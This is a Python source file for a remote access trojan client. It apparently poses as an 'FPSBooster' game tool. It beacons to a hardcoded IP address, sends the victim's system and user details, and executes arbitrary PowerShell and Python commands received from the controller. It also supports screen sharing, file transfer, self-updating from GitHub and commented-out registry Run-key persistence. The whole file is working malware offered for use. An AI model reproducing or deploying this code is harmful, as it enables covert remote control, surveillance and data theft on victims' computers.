import socket
import subprocess
import os
import platform
from threading import Thread
from datetime import datetime
import ctypes
import psutil
import uuid
from multiprocessing import Process
import cv2
from PIL import ImageGrab
import numpy as np
import pickle
import struct
import io
import time
import winreg as reg
from modules.screenshare import ScreenShare
from modules.filetransfer import FileTransfer
import requests
import sys
import zipfile

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

# def AddToRegistry():

#     # in python __file__ is the instant of
#     # file path where it was executed
#     # so if it was executed from desktop,
#     # then __file__ will be
#     # c:\users\current_user\desktop
#     pth = os.path.dirname(os.path.realpath(__file__))

#     # name of the python file with extension
#     s_name="mYscript.py"

#     # joins the file name to end of path address
#     address=os.join(pth,s_name)

#     # key we want to change is HKEY_CURRENT_USER
#     # key value is Software\Microsoft\Windows\CurrentVersion\Run
#     key = HKEY_CURRENT_USER
#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

#     # open the key to make changes to
#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)

#     # modify the opened key
#     reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)

#     # now close the opened key
#     reg.CloseKey(open)


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.command_history = []

        self.check_version()

        self.screenshareClient = ScreenShare()

        self.file_transfer_manager = FileTransfer(
            "192.168.98.223", 4440
        )

        self.file_transfer_thread = Thread(
            target=self.file_transfer_manager.connect
        )
        self.file_transfer_thread.start()
        # Compare this version and a the version on github.

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False

        while not connected:
            try:
                s.connect((self.host, self.port))
                s.send(self.gather_info().encode())
                connected = True
            except Exception as e:
                print(f"Error connecting: {str(e)}")
                time.sleep(5)  # Wait for 5 seconds before retrying

    def gather_info(self):
        info = str(
            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}|Current_Directory:{os.getcwd().replace(':', 'colon')}")

        return info

    def execute(self):
        while True:
            command = s.recv(100024).decode()
            try:
                command = command.split("|", 1)
                command_type = command[0].split("command_type")[
                    1].replace(":", "")
                command_cmd = command[1].split("command")[1].replace(":", "")
                if command_type == "function":
                    output = self.handle_function(command_cmd)
                elif command_type == "python":
                    output = subprocess.check_output(
                        ["python", "-c", command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()

                else:
                    output = subprocess.check_output(
                        ["powershell.exe", "-Command",
                            command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()

            except subprocess.CalledProcessError as e:
                output = str(e.output)

            s.send(output.encode())

    def handle_function(self, function_name):
        if function_name == "screen_share":
            # Use the self.screenshareClient object to start the screenshare but in a separate process
            self.screen_share_process = Process(
                target=self.screenshareClient.start_screenshare)
            self.screen_share_process.start()
            return "Screen share started successfully at port 8080"
        elif function_name == "stop_screen_share":
            # Stop the screenshare
            self.screenshareClient.stop_screenshare()
            # Terminate the process
            self.screen_share_process.terminate()
            return "Screen share stopped successfully"

    def check_version(self):
        self.github_version = requests.get(
            "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
        ).text.strip()
        # The text file should just look like this: 1.0.0
        # Open up our own version file and read the version
        with open("ver.txt", "r") as f:
            current_version = f.read().strip()

        if self.github_version != current_version:
            # The versions are different, so we need to update
            # Download the new version
            self.download_new_version(self.github_version)

    def download_new_version(self):
        # Download the new version
        response = requests.get(
            "https://github.com/lukasolsen/FPSBooster/archive/main.zip")
        # Write the zip file to disk
        with open("new_version.zip", "wb") as f:
            f.write(response.content)
        # Extract the zip file
        with zipfile.ZipFile("new_version.zip", "r") as zip_ref:
            zip_ref.extractall()
        # Delete the zip file
        os.remove("new_version.zip")
        # Delete the old version
        os.remove("ver.txt")
        # Rename the new version
        os.rename("FPSBooster-main", "FPSBooster")
        # Write the new version to a file
        with open("ver.txt", "w") as f:
            f.write(self.github_version)
        # Restart the RAT
        subprocess.Popen(["python", "main.pyw"])
        # Exit the current RAT
        sys.exit(0)


if __name__ == '__main__':
    # for school: 192.168.98.223
    rat = RAT_CLIENT('192.168.98.223', 4444)

    while True:
        try:
            rat.build_connection()
            rat.execute()
        except Exception as e:
            print(f"Error in main loop: {str(e)}")
            time.sleep(5)  # Wait for 5 seconds before retrying
